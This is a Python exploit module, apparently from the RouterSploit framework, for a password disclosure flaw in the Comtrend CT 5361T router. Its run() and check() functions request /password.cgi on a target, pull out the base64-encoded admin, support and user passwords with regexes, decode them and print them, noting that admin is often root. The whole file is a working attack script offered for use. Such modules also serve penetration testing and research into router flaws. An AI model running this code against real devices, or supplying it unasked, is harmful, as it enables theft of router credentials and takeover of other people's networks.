# rsf exploit module
# description: WiFi router Comtrend CT 5361T suffers from a Password Disclosure Vulnerability

import re
from base64 import b64decode
from requests import get  # Using standard libraries (requests)

class Exploit:
    __info__ = {
        "name": "Comtrend CT 5361T Password Disclosure",
        "description": "WiFi router Comtrend CT 5361T suffers from a Password Disclosure Vulnerability",
        "authors": (
            "TUNISIAN CYBER",  # authors of the exploit
        ),
        "references": (
            "https://packetstormsecurity.com/files/126129/Comtrend-CT-5361T-Password-Disclosure.html",
        ),
        "devices": (
            "Comtrend CT 5361T (more likely CT 536X)",
        )
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        if self.check():
            response = get(f"http://{self.target}:{self.port}/password.cgi")
            if response is None:
                return

            regexps = [
                ("admin", "pwdAdmin = '(.+?)'"),
                ("support", "pwdSupport = '(.+?)'"),
                ("user", "pwdUser = '(.+?)'")
            ]

            creds = []
            for regexp in regexps:
                res = re.findall(regexp[1], response.text)

                if res:
                    value = str(b64decode(res[0]), "utf-8")
                    creds.append((regexp[0], value))

            if len(creds):
                print("Credentials found!")
                headers = ("Login", "Password")
                for cred in creds:
                    print(f"{cred[0]}: {cred[1]}")
                print("NOTE: Admin is commonly implemented as root")
            else:
                print("Credentials could not be found")
        else:
            print("Device seems to be not vulnerable")

    def check(self):
        response = get(f"http://{self.target}:{self.port}/password.cgi")

        if response is None:
            return False  # target is not vulnerable

        regexps = ["pwdAdmin = '(.+?)'",
                   "pwdSupport = '(.+?)'",
                   "pwdUser = '(.+?)'"]

        for regexp in regexps:
            res = re.findall(regexp, response.text)

            if len(res):
                try:
                    b64decode(res[0])  # checking if data is base64 encoded
                except Exception:
                    return False  # target is not vulnerable
            else:
                return False  # target is not vulnerable

        return True  # target is vulnerable

